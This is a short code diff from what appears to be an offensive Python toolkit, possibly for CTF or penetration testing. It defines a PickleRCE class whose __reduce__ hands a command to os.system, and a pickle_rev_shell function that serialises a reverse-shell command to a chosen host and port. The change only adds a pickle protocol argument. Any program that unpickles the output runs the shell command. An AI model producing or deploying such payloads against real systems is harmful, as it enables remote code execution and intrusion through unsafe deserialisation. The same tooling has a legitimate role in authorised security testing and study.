@@ -43,8 +43,8 @@ class PickleRCE:
 	def __reduce__(self):
 		return os.system, (self.cmd, )
 
-def pickle_rev_shell(host, port, typ="python"):
-	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)))
+def pickle_rev_shell(host, port, typ="python", protocol=None):
+	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
 
 _chars = (string.ascii_letters + string.digits + string.punctuation +
 	string.whitespace).translate(str.maketrans("", "", "%_*?")) + "_?*%"
